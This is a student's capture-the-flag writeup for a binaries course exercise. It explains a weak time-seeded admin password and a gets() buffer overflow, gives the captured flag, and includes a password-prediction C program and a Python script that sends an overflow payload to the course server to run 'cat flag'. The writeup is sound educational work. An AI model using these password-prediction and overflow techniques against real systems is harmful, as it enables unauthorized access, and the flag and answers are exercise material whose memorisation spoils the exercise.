# Writeup 8 - Binaries II

Name: *Sara Garcia-Beech*
Section: *0101*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: *Sara Garcia-Beech*

## Assignment Writeup

### Part 1 (100 pts)
Answer the following questions regarding the server executable (for which source is provided).

1. How is the per-session administrator password generated? Are there any inherent weaknesses in this implementation?

A 16 character string is generated using the rand function, taking the current time as the seed parameter. This is inherently weak as a separate program could produce the same "random" password if it is run at the same time.

2. Describe two vulnerabilities in this program. Provide specific line numbers and classifications of the vulnerability. Explain potential ramifications as well as ways to avoid these vulnerabilities when writing code.

Line 68: The program takes a command from the user as input, but since the program uses the gets function here, it does not check the length of the input. This could potentially cause buffer overflows depending on what input is given.

Line 71: The program uses the nonstandard strcasestr function to compare the command given as user input to a list of acceptable user commands. If unchecked input causes a buffer overflow, the command variable could be overwritten and the strcasestr function could compare the input with something other than the command variable's encoded contents.

3. What is the flag?

CMSC389R-{expl017-2-w1n}

4. Describe the process you followed to obtain the flag: vulnerabilities exploited, your inputs to the server in a human-readable format, etc. If you create any helper code please include it.

I began by attempting to determine the password. The vulnerability in the generation of the password meant that it was possible to replicate the password generation with my own program, given that the program was run within the same second as the server's own password generation. This was done with my pwd.c program. Redirecting the output of the pwd.c function into the server allowed me to raise my privileges to those of admin and run commands. Running ls on the server revealed a file named flag, but there was no way to read the contents of the file with the limited whitelisted commands. However, the server took in user input for a command with the gets function, which is vulnerable to buffer overflows. Giving the program an input longer than 32 characters overwrote the commands variable with the contents of the string after the 32nd character. To run `cat flag`, I gave as input `cat flag`, followed by enough spaces to reach 32 characters, and then the same thing repeated, so that strcasestr would compare `cat flag` plus 24 spaces with itself, return true, and run cat flag without a problem.

Input summary:
```
3
Output of pwd.c
4
"cat flag                         cat flag                         "
```

pwd.c:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

#define BUFF_SIZE 32
#define FLAG_SIZE 32
#define PASS_SIZE 16

int main(void) {
    int i, prompt_response;
    /* password for admin to provide to dump flag */
    char *password;
    /* true if user is admin */
    uint8_t admin;

    /* seed random with time so that we can password */
    srand(time(0));
    admin = 0;
    password = calloc(1, PASS_SIZE+1);
    for (i = 0; i < PASS_SIZE; i++) {
        password[i] = rand() % ('z'-' ') + ' ';
    }
    password[PASS_SIZE] = 0;

    printf("%s", password);

    return 0;
}
```

stub.py:
```
import socket
import os
import sys

host = "ec2-18-222-89-163.us-east-2.compute.amazonaws.com"
port = 1337

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    command = "cat flag                         cat flag                         "

    data = s.recv(1048)
    print(data)

    s.send("3\n")
    data = s.recv(1048)
    print(data)

    os.system("./pwd >> temp.txt")
    os.system("cat temp.txt")
    fl = open("temp.txt", "r")
    pwd = fl.read().split('\n')[0] + '\n'
    print("PWD:")
    print(pwd)
    print("****")

    s.send(pwd)

    data = s.recv(1048)
    print(data)

    s.send("4\n")
    print("Sending 4...")
    data = s.recv(1048)
    print(data)
    s.send(command + "\n")
    print("sending ls...")
    data = s.recv(1048)
    print(data)
    data = s.recv(1048)
    print(data)

    os.system("rm temp.txt")

server()
```
